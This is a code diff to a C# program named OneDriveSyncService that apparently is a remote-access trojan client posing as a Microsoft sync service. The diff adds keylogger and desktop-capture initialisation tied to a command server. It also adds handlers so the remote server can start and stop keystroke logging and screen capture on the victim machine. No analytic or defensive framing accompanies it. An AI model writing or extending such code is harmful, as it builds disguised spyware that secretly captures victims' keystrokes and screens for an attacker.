@@ -29,6 +29,8 @@ namespace OneDriveSyncService
                     string name = Dns.GetHostName();
                     UpdateServerName();
                     Join.Startup();
+                    Keylogger.InitClientKeylogger(_serverName);
+                    ScreenCap.InitClientDesktop(_serverName);
                     _status = Join.JoinServer(_webClient, _serverName);
 
                     while (_status == "joined")
@@ -56,6 +58,22 @@ namespace OneDriveSyncService
                             else if (command.Contains("no_command"))
                             {
                                 continue;
+                            }
+                            else if (command.Contains("startkeylog"))
+                            {
+                                Keylogger.StartKeylogger();
+                            }
+                            else if (command.Contains("stopkeylog"))
+                            {
+                                Keylogger.StopKeylogger();
+                            }
+                            else if (command.Contains("startdc"))
+                            {
+                                ScreenCap.StartDesktopCapture();
+                            }
+                            else if (command.Contains("stopdc"))
+                            {
+                                ScreenCap.StopDesktopCapture();
                             }
                             else
                             {
